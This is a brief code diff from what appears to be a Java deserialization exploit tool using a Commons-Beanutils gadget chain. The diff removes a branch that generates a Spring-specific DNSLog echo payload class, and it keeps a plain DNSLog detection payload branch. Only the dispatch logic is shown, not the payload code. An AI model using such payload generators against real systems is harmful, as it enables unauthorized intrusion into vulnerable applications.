@@ -128,10 +128,6 @@ public class CommonsBeanutilsPropertySource_183 {
             // DNSLog 探测
             DNSLogEcho dnsLogEcho = new DNSLogEcho();
             ctClass = dnsLogEcho.genPayload(pool);
-        } else if (echoType.equals("DNSLogEchoSpring")) {
-            // DNSLog 探测（Spring 版本）
-            DNSLogEchoSpring dnsLogEchoSpring = new DNSLogEchoSpring();
-            ctClass = dnsLogEchoSpring.genPayload(pool);
         } else {
             throw new Exception("不支持的回显类型: " + echoType);
         }
